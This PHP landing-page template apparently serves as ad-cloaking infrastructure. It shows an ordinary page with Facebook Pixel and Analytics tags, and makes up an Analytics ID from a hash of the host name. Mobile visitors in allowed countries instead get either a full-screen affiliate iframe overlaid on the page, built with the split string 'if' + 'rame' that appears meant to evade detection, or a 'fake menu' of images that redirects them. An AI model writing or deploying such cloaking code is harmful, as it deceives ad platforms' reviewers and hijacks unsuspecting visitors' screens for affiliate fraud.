<?php
require_once "config.php";

$googleanalytics_id = (hexdec(substr(sha1($_SERVER['HTTP_HOST']), 0, 15)) % 99999999);
$my_phone_num = (hexdec($googleanalytics_id) % 9999999);
//$zip = (hexdec($my_phone_num) % 9999);
//$building = (hexdec($zip) % 99);
//$flat = (hexdec($building) % 999);

$og_url = (isSSL() ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$iframe_url 	= stringInJsConcatenation(addParamsToUrl($aff_link,$_GET));
?>
<!DOCTYPE HTML>
<html>
	<head>
        <title><?=$title?></title>
        
        <?php include($head_html); ?>
		
		<meta property="og:url"                content="<?=$og_url?>" />
		<meta property="og:type"               content="<?=$og_type?>" />
		<meta property="og:title"              content="<?=$og_title?>" />
		<meta property="og:description"        content="<?=$og_description?>" />
		<meta property="og:image"              content="<?=$og_image?>" />
		<?= ($fb_appid != "") ? '<meta property="fb:app_id"             content="' . $fb_appid . '"/>' : '' ?>
		
        <?php //////////////////////////////////////////////////
        // >>> Device detection lib
        //////////////////////////////////////////////////////?>
        <script type="text/javascript" src="//wurfl.io/wurfl.js"></script>
        <?php //////////////////////////////////////////////////
        // <<< Device detection lib 
        //////////////////////////////////////////////////////?>
        
        <?php //////////////////////////////////////////////////
        // >>> geo check
        //////////////////////////////////////////////////////?>
        <?php $geo_is_ok = ($enable_geo_check) ? in_array(getCountryCode(), $allowed_countries) : true;?>
        <script>var geo_is_ok = <?= ($geo_is_ok) ? 'true' : 'false' ?>;</script>
        <?php //////////////////////////////////////////////////
        // <<< geo check 
        //////////////////////////////////////////////////////?>
        
        <?php //////////////////////////////////////////////////
        // >>> fake menu style
        //////////////////////////////////////////////////////?>
        <? if ($mode == "menu"): ?>
        <style>
        .slide0 {
            display:none;
        }

        @media only screen and (max-device-width: 480px) { 
            .slide0 {
                display:block;
                padding-top:15px;
                text-align: center;
                height: 2100px;
        }
        </style>
        <? endif; ?>
        <?php //////////////////////////////////////////////////
        // <<< fake menu style
        //////////////////////////////////////////////////////?>
        
        <?php //////////////////////////////////////////////////
        // >>> Facebook pixel code: 
        //////////////////////////////////////////////////////?>
        <? if (!empty($pixel_id)): ?>
        <!-- Facebook Pixel Code -->
        <script>
        !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
        n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
        document,'script','https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '<?=$pixel_id?>'); // Insert your pixel ID here.
        fbq('track', 'PageView');
        </script>
        <noscript><img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=<?=$pixel_id?>&ev=PageView&noscript=1"
        /></noscript>
        <!-- DO NOT MODIFY -->
        <!-- End Facebook Pixel Code -->
        <? endif; ?>
        <?php //////////////////////////////////////////////////
        // <<< Facebook pixel code: 
        //////////////////////////////////////////////////////?>
	</head>
	
	<body>
    
    <?php //////////////////////////////////////////////////
    // >>> fake menu 
    //////////////////////////////////////////////////////?>
    <? if ($mode == "menu"): ?>
    <div class="slide0" id="slide0">
        <img src="<?=$question_img?>" alt="my_logo" style="max-width:100%" width="100%">
        <a href="policy.php"><img src="images/menu2.png"></a>
        <a id="img2" href="#" ><img src="<?=$answer_img?>" style="max-width:100%"></a>
        <a href="useragreement.php"><img src="images/menu4.png"></a>
    </div>
    <script>
    if (geo_is_ok && WURFL.is_mobile === true) {
        document.getElementById("slide0").style.cssText="display:block;padding-top:15px;text-align: center;height: 2100px;";
        document.getElementById("img2").addEventListener("click", function(){ document.location.href=<?=stringInJsConcatenation("mob.php")?>;return false; });
    }
	</script>
    <? endif; ?>
    <?php //////////////////////////////////////////////////
    // <<< fake menu 
    //////////////////////////////////////////////////////?>
    
    
    <?php //////////////////////////////////////////////////
    // >>> iframe code 
    //////////////////////////////////////////////////////?>
	<? if ($mode == "iframe"): ?>
	<script>
	/**
	 * Determine the mobile operating system.
	 * This function returns one of 'iOS', 'Android', 'Windows Phone', or 'unknown'.
	 *
	 * @returns {String}
	 */
	function getMobileOperatingSystem() {
	  var userAgent = navigator.userAgent || navigator.vendor || window.opera;

		  // Windows Phone must come first because its UA also contains "Android"
		if (/windows phone/i.test(userAgent)) {
			return "Windows Phone";
		}

		if (/android/i.test(userAgent)) {
			return "Android";
		}

		// iOS detection from: http://stackoverflow.com/a/9039885/177710
		if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
			return "iOS";
		}

		return "unknown";
	}
	
	window.onload = function(){
			var frm = document.createElement('if' + 'rame');
			frm.setAttribute("id","frm");
			frm.setAttribute("src",<?=$iframe_url?>);
			if (getMobileOperatingSystem() == "iOS") {
				frm.setAttribute("style", "position:absolute; top:0; left:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; background-color:white;");
			} else {
				frm.setAttribute("style", "position:fixed; top:0; left:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; background-color:white;");
			}
			if (geo_is_ok && WURFL.is_mobile === true) {
                document.body.appendChild(frm);
            }
		}
	</script>
	<? endif; ?>
    <?php //////////////////////////////////////////////////
    // <<< iframe code 
    //////////////////////////////////////////////////////?>
	
	<div>
    <?php //////////////////////////////////////////////////
    // >>> Facebook SDK 
    //////////////////////////////////////////////////////?>
	<? if ($fb_buttons): ?>
	<!-- Load Facebook SDK for JavaScript -->
		<div id="fb-root"></div>
		<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9<?= ($fb_appid != "") ? '&appId=' . $fb_appid : '' ?>";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));</script>
	<? endif; ?>
    <?php //////////////////////////////////////////////////
    // <<< Facebook SDK
    //////////////////////////////////////////////////////?>
    
	<?php include($body_html); ?>
    
    <?php //////////////////////////////////////////////////
    // >>> Google Analytics code
    //////////////////////////////////////////////////////?>
    <? if ($googleanalytics_id != ""): ?>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-<?=$googleanalytics_id?>-1', 'auto');
      ga('send', 'pageview');
    </script>
    <? endif; ?>
    <?php //////////////////////////////////////////////////
    // <<< Google Analytics code
    //////////////////////////////////////////////////////?>
    
</body>

</html>
